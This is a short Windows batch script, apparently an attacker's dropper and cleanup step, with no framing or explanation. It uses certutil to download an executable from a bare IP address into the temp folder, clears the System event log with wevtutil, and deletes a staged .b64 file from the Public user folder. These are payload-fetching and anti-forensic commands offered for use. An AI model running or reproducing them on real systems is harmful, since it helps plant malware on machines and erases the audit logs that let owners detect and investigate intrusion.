@echo off
certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\c.exe
wevtutil cl System
del /q C:\Users\Public\a.b64
